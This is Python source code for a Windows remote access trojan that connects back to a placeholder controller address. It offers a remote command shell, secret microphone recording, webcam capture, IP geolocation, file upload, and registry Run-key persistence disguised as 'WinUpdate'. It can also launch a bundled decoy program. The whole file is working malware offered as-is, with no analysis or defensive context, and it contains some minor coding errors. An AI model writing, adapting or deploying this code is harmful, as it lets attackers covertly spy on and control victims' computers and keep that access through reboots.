import socket
import subprocess
import os
import sys
import time
import struct
import shutil
import winreg
import threading
import cv2
import requests
import sounddevice as sd
import wavio
import io
from PIL import ImageGrab
from cryptography.fernet import Fernet

KEY = 'RANDOM_KEY'
fernet = Fernet(KEY)

auth_code = 'authcode'

HOST = '__ipaddr__'
PORT = 12345

fileName = "app.exe"
use_app = False

time_value = 90

def encrypt(data): return fernet.encrypt(data)
def decrypt(data): return fernet.decrypt(data)

def del_persistence(conn):
    try:
        key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_ALL_ACCESS
    )
        winreg.DeleteValue(key, "WinUpdate")
        winreg.CloseKey(key)
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        os.remove(target)
        send_data(conn , b'completed')
    except:pass

def add_persistence(conn):
    try:
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        if not os.path.exists(target):
            shutil.copyfile(sys.executable, target)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        send_data(conn, b'completed')
    except: pass

def send_data(conn, data: bytes):
    enc = encrypt(data)
    conn.send(struct.pack('>I', len(enc)))
    conn.send(enc)

def recv_command(conn):
    return decrypt(conn.recv(1024)).decode()

def handle_shell(conn):
    conn.send(encrypt(b'[+] Created Shell\n'))
    while True:
        try:
            data = recv_command(conn)
            if data == "exit":
                break
            elif data.startswith("cd "):
                os.chdir(data[3:])
                send_data(conn, os.getcwd().encode())
            else:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate()
                output = stdout_value + stderr_value
                if not output:
                    output = b"<No output>\n"
                send_data(conn, output)
        except Exception as error:
            send_data(conn, f"[-] Error: {error}")
def handle_mic(conn):
    try:
        duration = 5
        fs = 44100
        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        wav_file = io.BytesIO()
        wavio.write(wav_file, rec, fs, sampwidth=2)
        if wav_file.getvalue():
            send_data(conn, wav_file.getvalue())
    except:
        send_data(conn, b'Error')

def handle_upload(conn):
    try: 
        file_name = decrypt(conn.recv(1024)).decode()
        send_data(conn, b'control')

        data = recv_command(conn)
        with open(file_name, 'w') as f:
            f.write(data)
    except Exception as error: pass

def handle_cam(conn):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, jpeg = cv2.imencode('.jpg', frame)
            send_data(conn, jpeg.tobytes())
        else:
            send_data(conn, b'[-] Failed')
    except: send_data(conn, b'[-] Error Take Photo')

def handle_geo(conn):
    try:
        r = requests.get('https://ipinfo.io/json')
        send_data(conn, r.text.encode())
    except: send_data(conn, b'[-] Failed To Get Location')

def run(filename):
    if getattr(sys, "frozen", False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    program_path = os.path.join(base_path, filename)
    if os.path.exists(program_path):
        try:
            os.system(f"start {program_path}")
        except:
            pass
def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            if recv_command(s) != auth_code.decode(): break
            while True:
                cmd = recv_command(s)
                if cmd == "MODE_SHELL":
                    handle_shell(s)
                elif cmd == "MODE_MIC":
                    handle_mic(s)
                elif cmd == "MODE_UPLOAD":
                    handle_upload(s)
                elif cmd == "MODE_CAM":
                    handle_cam(s)
                elif cmd == "MODE_GEO":
                    handle_geo(s)
                elif cmd == "MODE_BACKDOOR":
                    add_persistence(s)
                elif cmd == "MODE_DEL":
                    del_persistence(s)
        except Exception as error:
            pass
if(use_app):
    run(filename=fileName)
if __name__ == "__main__":
    main()